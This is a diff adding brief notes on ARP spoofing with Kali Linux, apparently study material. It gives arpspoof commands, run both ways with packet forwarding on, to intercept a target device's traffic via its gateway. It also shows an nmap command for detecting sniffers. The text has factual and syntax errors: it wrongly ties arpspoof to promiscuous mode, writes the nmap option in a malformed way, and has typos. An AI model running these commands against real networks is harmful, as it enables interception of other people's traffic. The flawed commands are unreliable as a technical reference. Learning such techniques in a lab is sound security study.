@@ -1,0 +1,15 @@
+- checking apr entries using arp -a command
+- arpspoof tool used for arp spoofing
+- capturing the data packets of a device's internet activity
+	- We need to put kali linux in promiscous mode first.... to do so
+		-in kali linux root terminal
+			- command: arpspoof -i <name of the network interface> -t <ip address of default gateway <ip address of target system>
+				- eg: arpspoof -i eth0 -t 192.168.1.1 192.168.1.8
+		- then in another root terminal of kali linux
+			- write the same command used above, just exchange the ip of default gateway and the ip of target system
+				- eg: arpspoof -i eth0 -t 192.168.1.8 192.168.1.1
+		- also make sure that packet forwarding is enabled in your kali linux
+- For detecting packet sniffing, nmap script can be used
+	- command: nmap --script-sniffer-detect <ip address range available in our network>
+		- eg: nmap --script-sniffer-detect 192.168.1.0/24
+	- this script may fail sometimes when the ports are not open
